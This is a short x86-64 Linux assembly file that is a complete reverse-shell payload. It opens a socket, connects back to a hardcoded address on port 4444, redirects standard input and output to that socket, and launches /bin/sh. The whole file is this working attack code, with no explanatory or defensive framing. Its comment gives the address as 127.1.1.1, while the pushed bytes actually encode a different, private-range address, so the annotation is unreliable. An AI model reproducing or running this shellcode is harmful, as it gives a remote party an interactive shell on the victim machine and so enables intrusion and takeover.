bits 64
section .text
global _start

_start:
	
	; socket(AF_INET, SOCK_STREAM, 0)
	; (2, 1, 0)

	xor rdx, rdx
	lea rsi, [rdx + 1]
	lea rdi, [rdx + 2]

	push 0x29
	pop rax ; SYS_socket

	syscall

	; connect(sockfd, &saddr, 0x10)
	
	xchg rdi, rax

	push 0x4c01a8c0 ; IP Address: 127.1.1.1
	push word 0x5c11
	push ax

	mov rsi, rsp
	mov dl, 0x10

	mov al, 0x2a ; SYS_connect

	syscall

	; dup2(clientfd, [0,1,2])
	
	xchg rsi, rdx
	mov sil, 2
	duplicate:
		mov al, 0x21 ; SYS_dup2
		syscall
		dec sil
		jns duplicate

	; execve("/bin/sh", NULL, NULL)

	xor rsi, rsi
	push rsi
	pop rdx

	push rsi

	mov rdi, 0x68732f2f6e69622f ; /bin//sh
	push rdi
	mov rdi, rsp

	mov al, 0x3b ; SYS_execve
	syscall